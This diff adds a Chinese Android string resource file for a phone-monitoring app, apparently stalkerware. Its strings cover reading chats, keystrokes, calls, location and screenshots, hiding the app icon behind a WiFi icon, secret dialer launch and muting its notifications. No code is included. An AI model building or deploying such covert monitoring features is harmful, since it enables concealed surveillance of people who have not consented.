@@ -1,0 +1,352 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_log_name">应用</string>
+    <string name="check">在此卸载旧版本</string>
+    <string name="chrome_search_text">搜索或输入网址</string>
+    <string name="date_format_full">yyyy年M月d日</string>
+    <string name="date_format_point">yyyy.MM.dd</string>
+    <string name="date_format_short">M月d日</string>
+    <string name="dialog_allow_unknown_source">请允许安装未知应用以更新程序</string>
+    <string name="dialog_battery_optim">请关闭\"电池优化\"以确保应用正常工作</string>
+    <string name="dialog_battery_optim_on">电池优化仍处于启用状态！</string>
+    <string name="dialog_battery_optim_set">"：
+ - 在\"所有应用\"中选择\"不优化\"
+ - 找到并关闭应用\"%1$s\"
+ - 点击\"返回\"按钮"</string>
+    <string name="dialog_no">否</string>
+    <string name="dialog_ok">确定</string>
+    <string name="dialog_perm_accessibility">请启用应用无障碍服务</string>
+    <string name="dialog_perm_accessibility_on">应用无障碍服务仍未启用！</string>
+    <string name="dialog_perm_app">"请启用所有应用权限：
+ - 打开\"权限\"选项
+ - 启用所有权限"</string>
+    <string name="dialog_perm_app_off">部分应用权限仍未启用！</string>
+    <string name="dialog_perm_notif">请禁用应用通知</string>
+    <string name="dialog_perm_notif_on">应用通知仍处于启用状态！</string>
+    <string name="dialog_perm_overlay">请启用\"显示在其他应用上层\"权限以获取截图和解锁自拍</string>
+    <string name="dialog_perm_overlay_off">\"显示在其他应用上层\"权限仍未启用！</string>
+    <string name="dialog_perm_read_notif">请允许%1$s读取通知</string>
+    <string name="dialog_perm_read_notif_off">读取通知权限仍未启用！</string>
+    <string name="dialog_perm_scr">"请允许%1$s截取屏幕以获取截图：
+ - 勾选\"不再显示\"选项
+ - 点击\"立即开始\"按钮"</string>
+    <string name="dialog_perm_scr_off">屏幕截取功能仍未启用！</string>
+    <string name="dialog_perm_usage">"请启用\"使用情况访问\"权限以获取截图：
+ - 找到并点击应用\"%1$s\"
+ - 启用使用情况访问
+ - 点击\"返回\"按钮两次"</string>
+    <string name="dialog_perm_usage_off">\"使用情况访问\"权限仍未启用！</string>
+    <string name="dialog_pin_current">当前PIN码</string>
+    <string name="dialog_pin_retype">重新输入PIN码</string>
+    <string name="dialog_pin_specify">新PIN码</string>
+    <string name="dialog_run_app">打开隐藏应用的方法：</string>
+    <string name="dialog_run_app_sticker">使用\"贴纸\"小工具打开隐藏应用</string>
+    <string name="dialog_uninstall_ask">要卸载监控程序吗？</string>
+    <string name="dialog_update">更新</string>
+    <string name="dialog_wait">请稍候…</string>
+    <string name="dialog_yes">是</string>
+    <string name="email_msg_alarm">订阅将于%1$s后到期。</string>
+    <string name="email_msg_alarm_renew">"
+请续订您的订阅。"</string>
+    <string name="email_msg_alarm_stop">订阅已到期。</string>
+    <string name="email_msg_alarm_stop_logs">付费报告将被丢弃，除非您开始订阅。</string>
+    <string name="event_count">数量</string>
+    <string name="event_name">事件</string>
+    <string name="facebook_active">活跃</string>
+    <string name="facebook_add_your_story">你的故事</string>
+    <string name="facebook_call">通话与</string>
+    <string name="facebook_chat_head_with">"聊天头 "</string>
+    <string name="facebook_datetime_format">M月d日 ah:mm</string>
+    <string name="facebook_datetime_format24">M月d日 HH:mm</string>
+    <string name="facebook_friends">在Facebook上</string>
+    <string name="facebook_full_datetime_format">yyyy年M月d日 ah:mm</string>
+    <string name="facebook_full_datetime_format24">yyyy年M月d日 HH:mm</string>
+    <string name="facebook_goto_last_msg">跳至最新消息</string>
+    <string name="facebook_open_profile">打开个人资料</string>
+    <string name="facebook_thread_details">对话详情</string>
+    <string name="facebook_time_ago">前</string>
+    <string name="facebook_time_now">刚刚</string>
+    <string name="facebook_unread">未读</string>
+    <string name="facebook_weekdaytime_format">EEE ah:mm</string>
+    <string name="facebook_weekdaytime_format24">EEE HH:mm</string>
+    <string name="facebook_you">你：</string>
+    <string name="firefox_search_text">搜索或输入网址</string>
+    <string name="general_password">请输入您的PIN码</string>
+    <string name="global_settings_name">设置</string>
+    <string name="gm_now">现在</string>
+    <string name="hangouts_call">语音通话来自</string>
+    <string name="hangouts_conversation">对话：</string>
+    <string name="hangouts_date_format_with_year">yy/MM/dd ah:mm</string>
+    <string name="hangouts_date_format_with_year_24">yy/MM/dd HH:mm</string>
+    <string name="hangouts_from">"来自 "</string>
+    <string name="hangouts_minute">分钟</string>
+    <string name="hangouts_right_now">现在</string>
+    <string name="hangouts_second">秒</string>
+    <string name="hangouts_seen_by">"已读 "</string>
+    <string name="hangouts_simple_date_format">M月d日 ah:mm</string>
+    <string name="hangouts_simple_date_format_24">M月d日 HH:mm</string>
+    <string name="hangouts_wait">正在呼叫%1$s…</string>
+    <string name="hangouts_week_date_format">EEEE ah:mm</string>
+    <string name="hangouts_week_date_format_24">EEEE HH:mm</string>
+    <string name="hint_change_pin_new">输入新PIN码</string>
+    <string name="hint_enter_pin">输入PIN码</string>
+    <string name="hint_sms_hiden">[隐藏]</string>
+    <string name="ignore">跳过此步骤</string>
+    <string name="im_log_name">即时通讯</string>
+    <string name="inst_accessibility_activate_action">开启服务</string>
+    <string name="inst_accessibility_browsers_list">Chrome、Opera、Firefox、Samsung、Mint、ASUS</string>
+    <string name="inst_accessibility_caption">选择要跟踪的其他活动</string>
+    <string name="inst_accessibility_chats">聊天消息</string>
+    <string name="inst_accessibility_chats_list">WhatsApp、Facebook Messenger、Viber、Hangouts</string>
+    <string name="inst_accessibility_hint">"要访问屏幕内容，您需要激活无障碍服务：
+在列表中选择'%1$s'应用并启用。返回此页面。(系统可能此时关闭应用)"</string>
+    <string name="inst_accessibility_sites">网站历史</string>
+    <string name="inst_call_recording">电话录音</string>
+    <string name="inst_chat_recording">聊天通话录音</string>
+    <string name="inst_chose_device_type">请选择设备类型</string>
+    <string name="inst_enable_location_access">"应用需要访问位置：
+
+1. 找到并点击'权限'设置。
+2. 找到并点击'位置'设置。
+3. 启用：'始终允许'。"</string>
+    <string name="inst_finish_action">完成安装</string>
+    <string name="inst_finish_caption">配置完成</string>
+    <string name="inst_finish_hint">"安装完成！
+请在您的账户中查看日志。"</string>
+    <string name="inst_hello_cancel">取消安装</string>
+    <string name="inst_hello_caption">设置设备监控</string>
+    <string name="inst_hello_hint">如需监控此设备，请完成所有配置步骤。确保您已注册账户，然后点击下一步。</string>
+    <string name="inst_license_caption">最终用户许可协议</string>
+    <string name="inst_log_select_all">所有活动</string>
+    <string name="inst_log_select_apps">应用</string>
+    <string name="inst_log_select_calendar">日历</string>
+    <string name="inst_log_select_calls">通话记录</string>
+    <string name="inst_log_select_caption">选择要跟踪的设备活动</string>
+    <string name="inst_log_select_contacts">联系人</string>
+    <string name="inst_log_select_gallery">相册</string>
+    <string name="inst_log_select_hint">如果某些选项未勾选，您将无法远程启用它们。需要物理访问设备。</string>
+    <string name="inst_log_select_location">位置</string>
+    <string name="inst_log_select_sms">短信/彩信</string>
+    <string name="inst_log_select_system">系统事件</string>
+    <string name="inst_log_select_system_hint">(SIM卡、电池、网络信息)</string>
+    <string name="inst_log_select_unlock">解锁照片</string>
+    <string name="inst_log_typed_text">输入文本</string>
+    <string name="inst_login_activate">激活</string>
+    <string name="inst_login_caption">请输入您的凭据</string>
+    <string name="inst_login_forgot_password">忘记密码？</string>
+    <string name="inst_login_hint_email">输入邮箱</string>
+    <string name="inst_login_hint_password">输入密码</string>
+    <string name="inst_old_version_found">请卸载以下旧版本以避免可能出现的错误：</string>
+    <string name="inst_pin_caption">设置您的PIN码</string>
+    <string name="inst_pin_change">更改PIN码</string>
+    <string name="inst_pin_change_hint">PIN码</string>
+    <string name="inst_pin_change_icon">安卓系统限制隐藏应用图标。应用将以WiFi图标显示在设备上。</string>
+    <string name="inst_pin_hide_app">隐藏应用图标</string>
+    <string name="inst_pin_hint">可通过拨打***%1$s###启动应用</string>
+    <string name="inst_pin_turn_on">使用PIN码保护应用</string>
+    <string name="inst_rec_warning">某些安卓手机型号可能无法正常录音</string>
+    <string name="inst_requiremens_a11y">无障碍服务</string>
+    <string name="inst_requiremens_a11y_hint">无障碍服务用于提供扩展监控功能。</string>
+    <string name="inst_requiremens_a11y_instruction">"1. 点击已安装(下载)的服务。
+2. 点击'%1$s'。
+3. 打开开关并点击允许。
+4. 点击系统返回按钮直到返回此页面。"</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+如果服务激活被阻止，请打开设置>应用>'%1$s'，找到允许受限设置并打开。如果设置中未找到，请点击右上角三点菜单，然后打开并重复服务激活。"</string>
+    <string name="inst_requiremens_a11y_instruction_header">激活无障碍服务：</string>
+    <string name="inst_requiremens_basic">基本权限</string>
+    <string name="inst_requiremens_basic_hint">应用需要访问存储、手机设置、通话记录和联系人。</string>
+    <string name="inst_requiremens_basic_instruction">"1. 找到并点击'权限'设置。
+
+2. 启用：
+\u0009- 联系人
+\u0009- 电话
+\u0009- 存储
+
+3. 点击系统返回按钮直到返回此页面。"</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. 找到并点击'权限'设置。
+
+2. 启用：
+\u0009- 通话记录
+\u0009- 联系人
+\u0009- 电话
+\u0009- 存储
+
+3. 点击系统返回按钮直到返回此页面。"</string>
+    <string name="inst_requiremens_basic_instruction_header">允许权限：</string>
+    <string name="inst_requiremens_battery">禁用电池优化</string>
+    <string name="inst_requiremens_battery_hint">让应用始终在后台运行(关闭电池优化)，防止因省电功能停止应用</string>
+    <string name="inst_requiremens_caption">应用要求</string>
+    <string name="inst_requiremens_everything_ready">快完成了！只需再完成几个步骤！</string>
+    <string name="inst_requiremens_files_access_header">允许存储访问：</string>
+    <string name="inst_requiremens_files_access_instruction">1. 滚动列表直到看到<b>"'%1$s'"</b>"应用。
+
+2. "<b>打开</b>"开关以授予权限。
+
+3. 点击系统"<b>返回</b>按钮直到返回此页面。</string>
+    <string name="inst_requiremens_hint">请启用所有列出的选项以确保应用正常运行</string>
+    <string name="inst_requiremens_notifications">禁用应用通知</string>
+    <string name="inst_requiremens_notifications_access">通知访问权限</string>
+    <string name="inst_requiremens_notifications_access_hint">此权限允许读取通知。</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. 滚动列表直到看到<b>"'%1$s'"</b>"应用。
+
+2. "<b>打开</b>"开关以授予权限。
+
+3. "<b>点击</b><b>允许</b>"。
+
+4. 点击系统"<b>返回</b>按钮直到返回此页面。</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">允许通知访问：</string>
+    <string name="inst_requiremens_notifications_hint">应关闭此应用的通知，因为它们可能过于烦人。</string>
+    <string name="inst_requiremens_notifications_instruction">"1. 找到并点击'通知'设置。
+
+2. 关闭"<b>主开关</b>"。
+
+3. 点击系统"<b>返回</b>按钮直到返回此页面。</string>
+    <string name="inst_requiremens_notifications_instruction_26">1. 关闭<b>"'显示通知'"</b>"开关。
+
+2. 点击系统"<b>返回</b>按钮返回此页面。</string>
+    <string name="inst_requiremens_notifications_instruction_header">禁用此应用的通知：</string>
+    <string name="inst_requiremens_overlay">悬浮窗权限</string>
+    <string name="inst_requiremens_overlay_hint">应用需要能在其他应用上层显示。</string>
+    <string name="inst_requiremens_usage">使用情况访问</string>
+    <string name="inst_requiremens_usage_hint">此权限允许跟踪其他应用的活动。</string>
+    <string name="inst_requiremens_usage_instruction">1. 滚动列表直到看到<b>"'%1$s'"</b>"应用。
+
+2. "<b>点击</b>"该应用。
+
+3. "<b>打开</b>"开关以授予权限。
+
+4. 点击系统"<b>返回</b>按钮直到返回此页面。</string>
+    <string name="inst_requiremens_usage_instruction_header">允许使用情况访问：</string>
+    <string name="inst_screenshots_caption">您想记录哪种类型的截图？</string>
+    <string name="inst_screenshots_hint">"您需要允许应用无需确认即可截图。在权限请求对话框中设置'不再显示'复选框并点击立即开始按钮。"</string>
+    <string name="inst_screenshots_im">即时通讯</string>
+    <string name="inst_screenshots_sms">短信/彩信</string>
+    <string name="inst_screenshots_timer">定时，当前活动</string>
+    <string name="inst_screenshots_title">截图：</string>
+    <string name="inst_screenshots_web">网页浏览器</string>
+    <string name="inst_type_caption">请确认此应用将被正确使用</string>
+    <string name="inst_type_confirmation">我确认设备用户已知晓监控软件的存在并明确同意</string>
+    <string name="inst_type_employee">员工设备</string>
+    <string name="inst_type_intention">我将使用此软件监控：</string>
+    <string name="inst_type_kids">孩子的设备</string>
+    <string name="inst_type_own">我自己的设备</string>
+    <string name="license_accept">我接受</string>
+    <string name="license_read">我已阅读并理解条款</string>
+    <string name="license_text"><b>1.</b>" 您知晓本软件可以记录、存储和传输设备使用情况及用户活动信息。 
+ 
+"<b>2.</b>" 您仅可在以下条件下使用本软件： 
+您在自己拥有并个人使用的设备上使用本软件； 
+您已获得设备所有者和所有被监控用户的明确书面同意； 
+您是设备使用者的法定监护人； 
+ 
+"<b>3.</b> 您知晓并遵守所在司法管辖区关于隐私、保密和使用此类监控软件的法律法规。您对安装或使用本软件承担全部责任。软件开发者、销售者或分发者不对因您安装或使用软件导致的任何法律违规或后果负责。</string>
+    <string name="log_files_name">相册</string>
+    <string name="log_name_audio">音频</string>
+    <string name="log_name_file">文件</string>
+    <string name="log_name_gif">GIF动图</string>
+    <string name="log_name_image">图片</string>
+    <string name="log_name_sticker">贴纸</string>
+    <string name="log_name_video">视频</string>
+    <string name="menu_change_email">更改邮箱设置</string>
+    <string name="menu_change_pin">更改应用PIN码</string>
+    <string name="menu_check_app_state">检查应用权限</string>
+    <string name="menu_check_update">检查更新</string>
+    <string name="menu_clear">清除本地日志</string>
+    <string name="menu_close">关闭</string>
+    <string name="menu_disable_pin_protection">禁用PIN码保护</string>
+    <string name="menu_enable_pin_protection">启用PIN码保护</string>
+    <string name="menu_hide_icon">隐藏%1$s图标</string>
+    <string name="menu_reset_app_perm">重置应用权限</string>
+    <string name="menu_reset_license">重置许可证</string>
+    <string name="menu_select_source">更改音频源</string>
+    <string name="menu_show_icon">显示%1$s图标</string>
+    <string name="menu_uninstall">卸载</string>
+    <string name="module_calendar">日历事件</string>
+    <string name="module_calls">通话</string>
+    <string name="module_contacts">联系人</string>
+    <string name="module_files">文件</string>
+    <string name="module_location">位置</string>
+    <string name="module_mms">彩信</string>
+    <string name="module_photo">解锁自拍</string>
+    <string name="module_screen_shot">截图</string>
+    <string name="module_sim">更换SIM卡</string>
+    <string name="module_sms">短信</string>
+    <string name="module_web">访问的网站</string>
+    <string name="next">下一步</string>
+    <string name="opera_search_text">搜索或输入网址</string>
+    <string name="skype_call">响铃中</string>
+    <string name="skype_call_cancel">取消</string>
+    <string name="skype_call_conn">连接中</string>
+    <string name="skype_call_end">结束通话</string>
+    <string name="skype_start">"播放语音消息, "</string>
+    <string name="skype_stop">暂停语音消息</string>
+    <string name="status_Version">应用版本：</string>
+    <string name="status_activated">激活</string>
+    <string name="status_internet_connection">无网络连接</string>
+    <string name="status_last_send">最后数据上传：</string>
+    <string name="status_last_sync">最后连接：</string>
+    <string name="status_memory_usage">内存使用</string>
+    <string name="status_monitor_disabled">监控已禁用</string>
+    <string name="status_monitor_enabled">监控已启用</string>
+    <string name="status_record">记录</string>
+    <string name="status_send_data_period">数据上传周期</string>
+    <string name="status_server_connected">已连接</string>
+    <string name="status_valid">有效期至</string>
+    <string name="status_wifi">仅Wi-Fi</string>
+    <string name="telegram_date_format_full">yyyy年M月d日</string>
+    <string name="telegram_date_format_short">M月d日</string>
+    <string name="telegram_got">接收于</string>
+    <string name="telegram_got_ans1">已</string>
+    <string name="telegram_got_ans2">回复</string>
+    <string name="telegram_loaded">已下载</string>
+    <string name="telegram_pause">暂停</string>
+    <string name="telegram_sending">发送中</string>
+    <string name="telegram_sent">发送于</string>
+    <string name="telegram_video">视频</string>
+    <string name="telegram_viewed">已查看</string>
+    <string name="telegram_voice">语音消息</string>
+    <string name="text_log_name">输入文本</string>
+    <string name="time_day">天</string>
+    <string name="time_hrs">小时</string>
+    <string name="time_min">分</string>
+    <string name="time_sec">秒</string>
+    <string name="title_activity_installer">安装程序</string>
+    <string name="toast_digit_pin">PIN码只能包含数字</string>
+    <string name="toast_empty_email">请输入账户邮箱</string>
+    <string name="toast_empty_password">请输入账户密码</string>
+    <string name="toast_empty_pin">请输入应用PIN码</string>
+    <string name="toast_error_activation">激活错误</string>
+    <string name="toast_hide_icon">关闭应用后将隐藏%1$s图标。</string>
+    <string name="toast_length_pin">PIN码必须为4位数字</string>
+    <string name="toast_license_limit">许可证错误</string>
+    <string name="toast_license_locked">许可证已锁定</string>
+    <string name="toast_logs_cleared">本地日志已成功清除</string>
+    <string name="toast_no_inet">请检查网络连接</string>
+    <string name="toast_not_same_pin">PIN码不匹配</string>
+    <string name="toast_pin_changed">PIN码修改成功</string>
+    <string name="toast_reset_app_perms">两项权限均已禁用</string>
+    <string name="toast_server_not_available">服务器不可用，请检查网络连接或稍后再试</string>
+    <string name="toast_show_icon">关闭应用后将显示%1$s图标。</string>
+    <string name="toast_unkn_err">未知错误：</string>
+    <string name="toast_wrong_account_or_password">账户邮箱或密码错误</string>
+    <string name="toast_wrong_pin">PIN码错误</string>
+    <string name="today">今天</string>
+    <string name="update_current_version">当前版本：%1$s</string>
+    <string name="update_new_version">新版本：%1$s</string>
+    <string name="update_status_error_disable_link">更新链接不可用，请稍后再试</string>
+    <string name="update_status_error_disable_server">服务器不可用，请检查网络连接</string>
+    <string name="update_status_error_download">加载更新时出错</string>
+    <string name="update_status_ok_check_link">正在验证更新链接</string>
+    <string name="update_status_ok_check_server">正在验证服务器访问</string>
+    <string name="update_status_ok_download_update">正在下载更新…</string>
+    <string name="update_status_ok_install">正在安装更新…</string>
+    <string name="viber_change">编辑</string>
+    <string name="viber_date_format_full">yy/M/d</string>
+    <string name="whatsapp_date_format_full">yyyy年M月d日</string>
+    <string name="widget_enter_note">输入文本</string>
+    <string name="widget_hint">点击输入文本</string>
+    <string name="widget_name">贴纸</string>
+    <string name="yesterday">昨天</string>
+</resources>
